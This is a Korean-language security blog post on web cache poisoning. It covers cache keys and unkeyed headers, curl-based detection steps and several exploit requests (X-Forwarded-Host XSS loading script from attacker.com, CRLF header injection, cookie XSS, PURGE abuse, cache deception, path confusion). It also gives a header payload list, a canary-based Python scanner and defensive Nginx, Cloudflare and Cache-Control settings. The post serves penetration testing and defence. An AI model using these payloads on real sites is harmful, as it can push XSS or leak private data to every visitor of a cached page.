---
layout: post
title: Web Cache Poisoning
subtitle: Web Cache Poisoning 총정리
author: g3rm
categories: Web
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - WebCache
  - CachePoisoning
  - CDN
  - XSS
sidebar:
---
## Intro

Web Cache Poisoning은 진단하면서 임팩트가 가장 큰 취약점 중 하나라고 느낍니다. 일반적인 XSS는 피해자에게 링크를 클릭시켜야 하는데, **Cache Poisoning은 한번 성공하면 그 페이지를 보는 모든 사용자가 자동으로 영향**을 받습니다. 공격자가 가만히 있어도 피해가 확산되는 거죠.

요즘은 거의 모든 서비스가 Cloudflare, Akamai, AWS CloudFront 같은 CDN을 거치고, 자체 캐시 레이어(Varnish, Nginx Proxy Cache)도 흔하게 씁니다. 그만큼 캐시 키 설정이 잘못되면 전체 사용자에게 한방에 페이로드가 뿌려질 수 있습니다.

처음엔 "캐시는 그냥 성능 최적화 도구 아닌가?" 싶었는데, **Unkeyed Input** 개념을 알고 나서부터는 진단 시 항상 체크하는 항목이 됐습니다. 이 글에서는 Web Cache Poisoning의 원리와 진단 방법, 그리고 자주 보이는 페이로드들을 정리해두려고 합니다.

## Web Cache 이해

### 캐시 키(Cache Key)와 Unkeyed Input

캐시 시스템은 요청을 받으면 **캐시 키**를 생성해서 같은 키의 요청에 대해 저장된 응답을 그대로 돌려줍니다.

```
[일반적인 캐시 키 구성]
Cache Key = Method + Host + Path + Query String

[캐시 키에 포함되지 않는 입력 = Unkeyed Input]
- 일부 헤더 (X-Forwarded-Host, X-Original-URL 등)
- 쿠키 일부
- HTTP Method (일부 캐시는 GET/HEAD만 구분)
```

> 🔥 **Cache Poisoning의 핵심은 "Unkeyed Input이 응답에 영향을 주는 경우"** 입니다. 캐시 키엔 영향 없으면서 응답엔 영향 주는 입력이 있다면, 그걸 페이로드로 캐시에 저장시킬 수 있습니다.

### 동작 흐름

```
[정상 흐름]
1. User A → GET /home → Origin → 200 OK (정상 응답)
2. Cache 저장 (key: GET+host+/home)
3. User B → GET /home → Cache HIT → 저장된 응답 반환

[공격 흐름]
1. Attacker → GET /home + X-Forwarded-Host: evil.com → Origin
   → Origin이 응답에 evil.com 반영
2. Cache 저장 (key는 동일하므로 정상 요청과 같은 키)
3. User B → GET /home → Cache HIT → 오염된 응답 반환
   → User B의 브라우저에서 evil.com 리소스 로드
```

### Source & Sink

```
# Source (Unkeyed Input - 캐시 키 외 영향 주는 입력)
- X-Forwarded-Host, X-Forwarded-Scheme, X-Forwarded-Proto
- X-Original-URL, X-Rewrite-URL
- X-Host, X-Forwarded-Server
- 쿠키 (일부 캐시는 unkeyed)
- HTTP Method 변형 (PURGE, FASTLY-* 등)

# Sink (응답에 반영되는 곳)
- Location 헤더 (리다이렉트)
- script src, link href, img src 등 리소스 URL
- 응답 본문에 삽입되는 호스트명
- 에러 페이지의 reflected 값
```

## Detect & Exploit

### Detect

#### 1단계: 캐시 시스템 식별

응답 헤더에서 캐시 시스템 단서를 먼저 찾습니다.

```bash
curl -sI https://victim.com/ | grep -iE 'cache|cf-|x-cache|age|vary|via'

# 자주 보이는 시그니처
X-Cache: HIT             # AWS CloudFront / Varnish
X-Cache: MISS            # 캐시 시스템 존재 확인
CF-Cache-Status: HIT     # Cloudflare
X-Served-By: cache-xxx   # Fastly
Age: 1234                # 캐시된 지 1234초 경과
Via: 1.1 varnish         # Varnish 사용
X-Drupal-Cache: HIT      # Drupal
X-Akamai-...             # Akamai
```

#### 2단계: 캐시 동작 확인

```bash
# 같은 요청을 두번 보내서 두번째에 X-Cache: HIT 뜨는지 확인
curl -sI https://victim.com/page | grep -i x-cache
curl -sI https://victim.com/page | grep -i x-cache

# 캐시 키 식별 - 어떤 파라미터가 캐시 키에 포함되는지
curl -sI "https://victim.com/page?utm=1" | grep -i age
curl -sI "https://victim.com/page?utm=2" | grep -i age
# Age 값이 리셋되면 utm 파라미터가 캐시 키에 포함됨
# Age 값이 유지되면 utm은 unkeyed (잠재적 공격 벡터)
```

> ☑️ `Age` 헤더는 **현재 캐시 응답이 origin에서 받은 지 몇 초 지났는지**를 알려줍니다. 같은 요청을 반복했을 때 Age가 증가하면 캐시 HIT, 0이면 MISS입니다.

#### 3단계: Unkeyed Input 식별

진단의 핵심 단계입니다. 헤더 하나씩 추가하면서 응답이 변하는지 확인합니다.

```bash
# baseline 응답
curl -s https://victim.com/page > baseline.html

# X-Forwarded-Host 변경
curl -s -H "X-Forwarded-Host: g3rm.test" https://victim.com/page > test.html

# diff로 응답 차이 확인
diff baseline.html test.html

# 응답에 g3rm.test가 등장하면 → 해당 헤더가 unkeyed + 응답 반영
# = Cache Poisoning 가능 후보
```

#### Param Miner (Burp Extension) 활용

수동으로 헤더 하나씩 테스트하는 건 비효율적이라 [Param Miner](https://github.com/PortSwigger/param-miner)를 거의 항상 씁니다.

```
1. Burp 진단 중 임의의 요청 우클릭
2. "Guess headers" / "Guess cookies" / "Guess parameters"
3. Param Miner가 알려진 헤더 워드리스트로 자동 fuzzing
4. 응답이 변하는 헤더 발견 시 Issue 생성

# 자주 발견되는 unkeyed 헤더
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
X-Host
X-Forwarded-Server
True-Client-IP
X-Wap-Profile
```

> 🔥 Param Miner는 [James Kettle의 Practical Web Cache Poisoning 연구](https://portswigger.net/research/practical-web-cache-poisoning)에서 같이 공개된 도구라 이 분야 진단 표준이라고 봐도 됩니다.

### Exploit

#### 1. X-Forwarded-Host 기반 XSS

가장 클래식한 케이스입니다. 응답에 호스트명이 그대로 박히는 패턴을 노립니다.

```http
GET /home HTTP/1.1
Host: victim.com
X-Forwarded-Host: g3rm.com/" onload="alert(1)"><img src="

# 취약 응답 (canonical link 등에 X-Forwarded-Host 반영)
<link rel="canonical" href="https://g3rm.com/" onload="alert(1)"><img src="/home">
```

```http
# 응답 본문이 아닌 script src에 반영되는 경우
GET / HTTP/1.1
Host: victim.com
X-Forwarded-Host: attacker.com

# 취약 응답
<script src="https://attacker.com/static/main.js"></script>
# → 공격자 도메인에서 main.js 호스팅하면 즉시 XSS
```

#### 2. X-Forwarded-Scheme 통한 리다이렉트 루프

```http
GET / HTTP/1.1
Host: victim.com
X-Forwarded-Scheme: nothttps

# 일부 서버는 scheme이 https가 아니면 무한 리다이렉트 발생
# → DoS로 캐시 오염
```

#### 3. Cache Key Injection (CR-LF / 줄바꿈)

```http
GET /page HTTP/1.1
Host: victim.com
X-Forwarded-Host: bunch%0d%0aContent-Length:%2050%0d%0a%0d%0a<script>...

# 캐시 시스템에 따라 헤더 파싱 방식이 달라서
# 응답 분할이나 의도하지 않은 헤더 주입이 가능한 케이스 존재
```

#### 4. Cookie 기반 Poisoning

일부 캐시는 쿠키를 unkeyed로 취급합니다.

```http
GET /home HTTP/1.1
Host: victim.com
Cookie: theme="><script>alert(1)</script>

# 응답에 쿠키 값이 반영되고 캐시되면
# 이후 모든 사용자에게 페이로드 전송
```

#### 5. HTTP Method 우회

```http
# 일반적인 GET 요청
GET /api/profile HTTP/1.1
Host: victim.com

# PURGE 메서드로 캐시 무효화 (관리자 전용 메서드 우회)
PURGE /api/profile HTTP/1.1
Host: victim.com

# FASTLY-PURGE
FASTLY-PURGE /api/profile HTTP/1.1
Host: victim.com
```

> ☑️ PURGE 메서드는 캐시 강제 갱신용으로, 일부 환경에선 인증 없이 호출 가능합니다. 이를 통해 캐시를 의도적으로 무효화하면서 공격 페이로드 캐싱 타이밍을 조절할 수 있습니다.

#### 6. Cache Deception (정적 파일 위장)

`Cache Poisoning`과 짝을 이루는 기법입니다. 동적 페이지를 정적 파일처럼 위장해서 민감한 데이터가 캐시되도록 유도합니다.

```http
# 정상
GET /api/profile HTTP/1.1
→ 인증된 사용자의 프로필 (캐시 안됨)

# 페이로드 (정적 파일 확장자 추가)
GET /api/profile/g3rm.css HTTP/1.1
GET /api/profile/g3rm.jpg HTTP/1.1
GET /api/profile;.css HTTP/1.1

# 일부 서버는 .css/.jpg를 그냥 무시하고 /api/profile 응답을 반환
# CDN은 .css 확장자 보고 자동 캐싱 → 다른 사용자에게도 노출
```

#### 7. Path Confusion

```http
# CDN과 origin이 path 정규화를 다르게 처리
GET /static/main.js/../api/admin HTTP/1.1
Host: victim.com

# CDN: /static/main.js 로 인식 (캐시 대상)
# Origin: /api/admin 으로 인식 (민감 데이터 응답)
# → 민감 데이터가 정적 파일 캐시에 저장
```

> 🔥 Path Confusion은 [Hyp0thesis의 발표](https://www.youtube.com/watch?v=0LCqOVgqZGI)에서 자세히 다뤄집니다. CDN과 origin의 path 처리 차이를 이용하는 거라 환경마다 페이로드가 다릅니다.

### Variant - 응답 헤더 오염

응답 본문이 아닌 헤더 자체를 오염시키는 변종입니다.

#### Cache Key가 응답 헤더에 반영되는 경우

```http
GET /home?utm_source=g3rm HTTP/1.1
Host: victim.com

# 취약 응답
HTTP/1.1 200 OK
Set-Cookie: lastUtm=g3rm; Path=/
Link: </home?utm_source=g3rm>; rel=canonical
```

여기서 `utm_source`에 페이로드를 넣으면 응답 헤더에 인젝션이 발생할 수 있습니다.

```http
# 페이로드
GET /home?utm_source=g3rm%0d%0aSet-Cookie:%20admin=1 HTTP/1.1
```

## 자주 보이는 페이로드 모음

### Header Injection 기반

```http
# Host header 오염
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Host: attacker.com
X-Original-Host: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com

# Scheme / Protocol 오염
X-Forwarded-Proto: http
X-Forwarded-Scheme: http
X-Forwarded-Ssl: off
X-Url-Scheme: http
Front-End-Https: off

# Path 오염
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-HTTP-Method-Override: PUT
X-Override-URL: /admin
```

### 캐시 무효화 / 키 조작

```http
# 캐시 키에 포함되지 않는 파라미터 식별
?utm_source=x
?fbclid=x
?gclid=x
?_=12345
?cb=12345

# 캐시 강제 갱신
Cache-Control: no-cache
Pragma: no-cache

# 일부 CDN의 디버그 헤더
Fastly-Debug: 1
X-Debug: 1
```

### CDN별 특수 헤더

| CDN | 특수 헤더 | 용도 |
| --- | --- | --- |
| Cloudflare | `CF-Connecting-IP`, `CF-IPCountry` | 클라이언트 정보 위조 |
| AWS CloudFront | `CloudFront-Forwarded-Proto`, `CloudFront-Viewer-Country` | 동일 |
| Akamai | `Akamai-Origin-Hop`, `True-Client-IP` | 동일 |
| Fastly | `Fastly-Client-IP`, `Fastly-FF` | 동일 |
| Varnish | `X-Varnish` | 디버그 |

## PoC - Cache Poisoning Scanner

진단 시 unkeyed input을 자동 식별하고 응답 반영 여부를 검증하는 스크립트입니다.

```python
# Python 3.11 / requests 2.31.0
# pip install requests==2.31.0
# 사용: python3 cache_poison.py -u https://victim.com/page
import requests
import logging
import argparse
import time
import string
import random
import sys
from urllib.parse import urlparse

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)

# ============================================================
# Unkeyed Input 후보 헤더 (James Kettle 연구 + 추가 변종)
# ============================================================
UNKEYED_HEADERS = [
    # Host 변형
    'X-Forwarded-Host',
    'X-Host',
    'X-Forwarded-Server',
    'X-HTTP-Host-Override',
    'X-Original-Host',
    'Forwarded',
    
    # Scheme / Proto
    'X-Forwarded-Scheme',
    'X-Forwarded-Proto',
    'X-Forwarded-Ssl',
    'X-Url-Scheme',
    'Front-End-Https',
    
    # URL / Path
    'X-Original-URL',
    'X-Rewrite-URL',
    'X-Override-URL',
    'X-HTTP-Method-Override',
    
    # Client info
    'X-Forwarded-For',
    'True-Client-IP',
    'CF-Connecting-IP',
    'X-Real-IP',
    
    # Etc
    'X-Wap-Profile',
    'X-Forwarded-Port',
    'X-Cluster-Client-IP',
]


class CachePoisonScanner:
    """Web Cache Poisoning Scanner"""
    
    def __init__(self, url, custom_headers=None, timeout=10):
        self.url = url
        self.parsed = urlparse(url)
        self.base_headers = custom_headers or {}
        self.timeout = timeout
        self.session = requests.Session()
        self.cache_system = None
        self.findings = []
    
    def _canary(self, length=8):
        """랜덤 카나리 토큰 생성 (응답 반영 추적용)"""
        return 'g3rm' + ''.join(
            random.choices(string.ascii_lowercase + string.digits, k=length)
        )
    
    def _request(self, extra_headers=None, cache_buster=None):
        """공통 요청 메서드"""
        headers = dict(self.base_headers)
        if extra_headers:
            headers.update(extra_headers)
        
        url = self.url
        if cache_buster:
            sep = '&' if '?' in url else '?'
            url = f"{url}{sep}cb={cache_buster}"
        
        try:
            return self.session.get(
                url, headers=headers,
                timeout=self.timeout,
                allow_redirects=False
            )
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed: {e}")
            return None
    
    def detect_cache_system(self):
        """Phase 1: 캐시 시스템 식별"""
        logging.info("=" * 60)
        logging.info("Phase 1: Cache System Detection")
        logging.info("=" * 60)
        
        r = self._request(cache_buster=self._canary())
        if not r:
            return False
        
        cache_signatures = {
            'cf-cache-status': 'Cloudflare',
            'x-cache': 'Generic (Varnish/CloudFront/Fastly)',
            'x-served-by': 'Fastly',
            'x-drupal-cache': 'Drupal',
            'x-akamai': 'Akamai',
            'via': 'Proxy/Cache',
        }
        
        detected = []
        for header, system in cache_signatures.items():
            if header in [h.lower() for h in r.headers.keys()]:
                detected.append(f"{system} ({header})")
        
        if 'age' in [h.lower() for h in r.headers.keys()]:
            detected.append(f"Age header present (Age={r.headers.get('Age')})")
        
        if detected:
            logging.warning("Cache system detected:")
            for d in detected:
                logging.warning(f"  - {d}")
            self.cache_system = detected
            return True
        else:
            logging.info("No obvious cache system signature found")
            logging.info("Continuing scan (may still have hidden cache)")
            return True
    
    def verify_caching(self):
        """Phase 2: 실제 캐싱 동작 확인"""
        logging.info("=" * 60)
        logging.info("Phase 2: Cache Behavior Verification")
        logging.info("=" * 60)
        
        # 같은 cache buster로 두번 요청 → Age 증가하면 캐싱 동작 확인
        cb = self._canary()
        
        logging.info("First request (expect MISS or Age=0)...")
        r1 = self._request(cache_buster=cb)
        if not r1:
            return False
        age1 = r1.headers.get('Age', 'N/A')
        cache1 = r1.headers.get('X-Cache') or r1.headers.get('CF-Cache-Status', 'N/A')
        logging.info(f"  Status: {r1.status_code} | Age: {age1} | Cache: {cache1}")
        
        time.sleep(2)
        
        logging.info("Second request (expect HIT or Age increased)...")
        r2 = self._request(cache_buster=cb)
        if not r2:
            return False
        age2 = r2.headers.get('Age', 'N/A')
        cache2 = r2.headers.get('X-Cache') or r2.headers.get('CF-Cache-Status', 'N/A')
        logging.info(f"  Status: {r2.status_code} | Age: {age2} | Cache: {cache2}")
        
        # 판정
        try:
            if age1 != 'N/A' and age2 != 'N/A' and int(age2) > int(age1):
                logging.warning("[+] Caching CONFIRMED (Age increased)")
                return True
        except ValueError:
            pass
        
        if 'HIT' in str(cache2).upper():
            logging.warning("[+] Caching CONFIRMED (X-Cache: HIT)")
            return True
        
        logging.info("[-] Caching not clearly confirmed, but proceeding")
        return True
    
    def find_unkeyed_inputs(self):
        """Phase 3: Unkeyed Header 식별"""
        logging.info("=" * 60)
        logging.info("Phase 3: Unkeyed Input Discovery")
        logging.info("=" * 60)
        
        # baseline 캡처
        baseline = self._request(cache_buster=self._canary())
        if not baseline:
            logging.error("Baseline capture failed")
            return
        baseline_text = baseline.text
        baseline_status = baseline.status_code
        
        total = len(UNKEYED_HEADERS)
        for idx, header in enumerate(UNKEYED_HEADERS, 1):
            canary = self._canary()
            logging.info(f"[Progress] {idx}/{total} | Testing: {header}")
            
            # 새 cache buster + 페이로드 헤더로 요청
            r = self._request(
                extra_headers={header: canary},
                cache_buster=self._canary()
            )
            if not r:
                continue
            
            # 응답에 카나리 반영 확인
            if canary in r.text:
                logging.warning(
                    f"  [REFLECTED] {header} value reflected in response body"
                )
                self.findings.append({
                    'type': 'reflected',
                    'header': header,
                    'canary': canary,
                    'severity': 'HIGH',
                    'evidence': f"canary '{canary}' found in response"
                })
            
            # 응답 헤더에 반영 확인
            for h_name, h_val in r.headers.items():
                if canary in str(h_val):
                    logging.warning(
                        f"  [HEADER-REFLECT] {header} → reflected in '{h_name}'"
                    )
                    self.findings.append({
                        'type': 'header_reflected',
                        'header': header,
                        'reflected_in': h_name,
                        'severity': 'HIGH',
                        'evidence': f"in header {h_name}: {h_val[:80]}"
                    })
            
            # 상태 코드 변화 (DoS 가능성)
            if r.status_code != baseline_status and r.status_code >= 400:
                logging.info(
                    f"  [STATUS-CHANGE] {header}: {baseline_status} → {r.status_code}"
                )
                self.findings.append({
                    'type': 'status_change',
                    'header': header,
                    'severity': 'MED',
                    'evidence': f"status {baseline_status} → {r.status_code}"
                })
    
    def verify_cacheable(self):
        """Phase 4: 발견된 unkeyed input이 실제 캐시되는지 검증"""
        logging.info("=" * 60)
        logging.info("Phase 4: Verify Cacheability of Findings")
        logging.info("=" * 60)
        
        if not self.findings:
            logging.info("No findings to verify")
            return
        
        for f in self.findings:
            if f['type'] != 'reflected':
                continue
            
            header = f['header']
            canary = f['canary']
            cb = self._canary()
            
            logging.info(f"Testing cacheability: {header}")
            
            # 1. 페이로드 + 새 cache buster
            r1 = self._request(
                extra_headers={header: canary},
                cache_buster=cb
            )
            time.sleep(2)
            
            # 2. 페이로드 없이 같은 cache buster로 재요청
            r2 = self._request(cache_buster=cb)
            
            if not r1 or not r2:
                continue
            
            # 페이로드 없이 보낸 요청에 카나리가 등장하면 = 캐시 오염 성공
            if canary in r2.text:
                logging.warning(
                    f"  [POISONABLE] {header} → cache poisoning CONFIRMED"
                )
                f['poisonable'] = True
                f['severity'] = 'CRITICAL'
            else:
                logging.info(f"  [SAFE] {header} reflected but not cached")
                f['poisonable'] = False
    
    def report(self):
        """결과 리포트"""
        logging.info("=" * 60)
        logging.info("Scan Report")
        logging.info("=" * 60)
        
        if not self.findings:
            logging.info("No vulnerabilities found")
            return
        
        critical = [f for f in self.findings if f.get('severity') == 'CRITICAL']
        high = [f for f in self.findings if f.get('severity') == 'HIGH']
        med = [f for f in self.findings if f.get('severity') == 'MED']
        
        print(f"\n[Summary] CRITICAL={len(critical)} HIGH={len(high)} MED={len(med)}")
        
        for f in self.findings:
            print(f"\n[{f.get('severity','?')}] {f.get('type')}")
            print(f"  Header:   {f.get('header')}")
            if 'reflected_in' in f:
                print(f"  Sink:     {f['reflected_in']}")
            print(f"  Evidence: {f.get('evidence')}")
            if f.get('poisonable'):
                print(f"  >>> CACHE POISONING CONFIRMED <<<")
        
        print("\n" + "=" * 60)
    
    def run(self):
        """전체 스캔 실행"""
        logging.info("Cache Poisoning Scanner started")
        logging.info(f"Target: {self.url}")
        
        start = time.time()
        
        if not self.detect_cache_system():
            logging.error("Failed to access target")
            return
        
        self.verify_caching()
        self.find_unkeyed_inputs()
        self.verify_cacheable()
        self.report()
        
        elapsed = time.time() - start
        logging.info(f"Scan finished in {elapsed:.1f}s")


def main():
    parser = argparse.ArgumentParser(
        description='Web Cache Poisoning Scanner'
    )
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-H', '--header', action='append', default=[],
                        help='Custom header (e.g., "Cookie: x=y")')
    parser.add_argument('-t', '--timeout', type=int, default=10)
    args = parser.parse_args()
    
    headers = {}
    for h in args.header:
        if ':' in h:
            k, v = h.split(':', 1)
            headers[k.strip()] = v.strip()
    
    scanner = CachePoisonScanner(
        url=args.url,
        custom_headers=headers,
        timeout=args.timeout
    )
    scanner.run()


if __name__ == '__main__':
    main()
```

> 🔥 도구 핵심은 **Phase 4의 cacheability 검증**입니다. 단순히 응답에 반영되는 것만 보면 false positive가 너무 많아서, **페이로드 없는 요청에서도 같은 카나리가 나오는지** 한 단계 더 확인해야 진짜 cache poisoning입니다.

## Security Measures

### 1. Unkeyed Input 응답 반영 차단

```nginx
# Nginx - X-Forwarded-Host 헤더 신뢰하지 않기
proxy_set_header X-Forwarded-Host "";

# 응답 생성 시 Host 헤더 정규화 (origin 단)
server {
    server_name victim.com;
    if ($host !~ ^(victim\.com|www\.victim\.com)$) {
        return 444;
    }
}
```

### 2. 캐시 키에 위험 헤더 포함

```nginx
# Nginx 캐시 키에 X-Forwarded-Host 추가
proxy_cache_key "$scheme$proxy_host$request_uri$http_x_forwarded_host";
```

```javascript
# Cloudflare Worker로 캐시 키 정규화
addEventListener('fetch', event => {
    const url = new URL(event.request.url);
    const cacheKey = new Request(
        url.toString(),
        {
            method: event.request.method,
            headers: {
                'Host': event.request.headers.get('Host'),
                // X-Forwarded-Host는 의도적으로 제외
            }
        }
    );
    event.respondWith(handle(event.request, cacheKey));
});
```

### 3. Cache-Control 헤더 정확히 설정

```http
# 인증된 사용자 응답 - 절대 캐시 금지
Cache-Control: private, no-store, no-cache, must-revalidate

# 정적 리소스 - 명시적 캐시
Cache-Control: public, max-age=31536000, immutable

# 동적 페이지 - 짧은 캐시 + revalidate
Cache-Control: public, max-age=60, stale-while-revalidate=30
```

### 4. Vary 헤더 활용

```http
# 캐시가 특정 헤더별로 응답을 분리해서 저장하도록
Vary: Accept-Encoding, Cookie, X-Forwarded-Host
```

> ☑️ Vary 헤더는 정확히 동작하지만 **캐시 효율성이 떨어진다**는 단점이 있습니다. 서비스에서 정말 그 헤더에 따라 응답이 달라야 하는 경우만 추가하는 게 좋습니다.

### 5. Cache Deception 방어

```nginx
# 정적 확장자 요청은 실제 정적 디렉토리에서만 서빙
location ~* \.(css|js|png|jpg|gif|ico|svg|woff2)$ {
    root /var/www/static;
    try_files $uri =404;
    # 동적 경로로 fallback 절대 금지
}

# /api/ 경로는 확장자 무시하고 그대로 라우팅
location /api/ {
    proxy_pass http://backend;
    # /api/profile.css 같은 요청도 그대로 origin으로
}
```

### 6. 진단 보고서 권고 템플릿

```
1. Unkeyed Input으로 의심되는 헤더 (X-Forwarded-Host 등) 응답 반영 차단
2. 인증 영역 응답에 Cache-Control: private, no-store 명시
3. 정적 확장자 라우팅을 정적 디렉토리로 한정
4. CDN 레벨에서 Path 정규화 정책 확인
5. 정기적인 Param Miner 기반 진단 절차화
```

## References

- [PortSwigger - Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [PortSwigger - Cache Poisoning at Scale](https://portswigger.net/research/web-cache-entanglement)
- [PortSwigger Web Security Academy - Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [Param Miner Burp Extension](https://github.com/PortSwigger/param-miner)
- [Omer Gil - Cache Deception](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html)
- [HackTricks - Cache Poisoning](https://book.hacktricks.xyz/pentesting-web/cache-deception)
- [PayloadsAllTheThings - Web Cache Poisoning](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Web%20Cache%20Deception/README.md)

 


 










